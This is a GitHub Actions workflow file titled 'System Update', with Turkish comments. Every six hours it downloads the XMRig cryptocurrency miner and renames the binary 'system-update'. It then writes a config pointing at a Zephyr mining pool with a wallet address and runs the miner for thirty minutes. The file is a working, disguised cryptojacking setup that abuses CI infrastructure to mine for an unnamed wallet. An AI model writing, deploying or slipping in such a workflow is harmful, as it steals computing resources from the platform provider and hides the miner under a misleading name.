name: System Update

on:
  schedule:
    - cron: '0 */6 * * *'  # Her 6 saatte bir
  workflow_dispatch:  # Manuel trigger

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout
        uses: actions/checkout@v3
      
      - name: Install Dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget git build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev
      
      - name: Download XMRig
        run: |
          cd /tmp
          wget https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-linux-static-x64.tar.gz
          tar -xzf xmrig-6.26.0-linux-static-x64.tar.gz
          cd xmrig-6.26.0
          mv xmrig system-update
      
      - name: Create Config
        run: |
          cd /tmp/xmrig-6.26.0
          echo '{"autosave":true,"cpu":{"enabled":true,"huge-pages":true,"max-threads-hint":100,"asm":true,"rx":{"asm":true,"msr":true,"jit":true}},"log":{"log-level":3,"print-time":10},"pools":[{"algo":"randomx","url":"de.zephyr.herominers.com:1123","user":"ZEPHYR3UsBjPbXaFoVnrGT5ReMf2DYfPv4JC51gFATKcJX66jgLP41DJHGAnEQrfVB5DnBRiyWk8qEA5F6gE7UhZe7pjCXtYM5T1L","pass":"github-actions-worker-1","enabled":true}],"randomx":{"rdmsr":true,"wrmsr":true}}' > config.json
      
      - name: Start Miner
        run: |
          cd /tmp/xmrig-6.26.0
          chmod +x system-update
          ./system-update &
          sleep 1800  # 30 dakika çalıştır
      
      - name: Check Process
        run: |
          ps aux | grep system-update
